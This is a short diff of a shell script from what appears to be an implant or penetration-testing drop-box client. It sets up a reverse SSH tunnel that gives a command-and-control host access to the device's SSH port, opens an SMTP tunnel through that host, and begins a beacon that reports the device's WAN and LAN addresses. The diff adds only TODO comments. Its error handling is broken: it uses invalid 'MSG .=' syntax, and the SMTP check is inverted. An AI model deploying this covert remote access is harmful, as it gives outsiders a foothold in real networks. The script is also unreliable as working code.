@@ -11,18 +11,20 @@
 source /opt/einar/client/config.sh
 
 # Setup our SSH Tunnel
+## This needs to be switched to tunnelup (a separate script)
 sudo -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f -n
 if [ $? == 1 ]; then 
 		MSG .= "Failed to establish SSH  Tunnel"
 	fi
-
+	
+	# This needs to be a separate script called something like mailtunnel.sh 
 	sudo -u $C2USER ssh -p $SSHPORT -L 2525:localhost:25 $C2USER@$C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f -n
 	if [ $? -eq 0 ]; then
 		MSG .= "Failed to establish SMTP Tunnel"
 	fi
 	
 
-
+		# All of this needs to be a separate script to send the proof of life
 		WAN_IP=$(curl ifconfig.me)
 		LAN_IP=$(ip ad | grep inet | awk '{print $2}' )
 		#SERIAL=$(dmidecode -s system-serial-number)
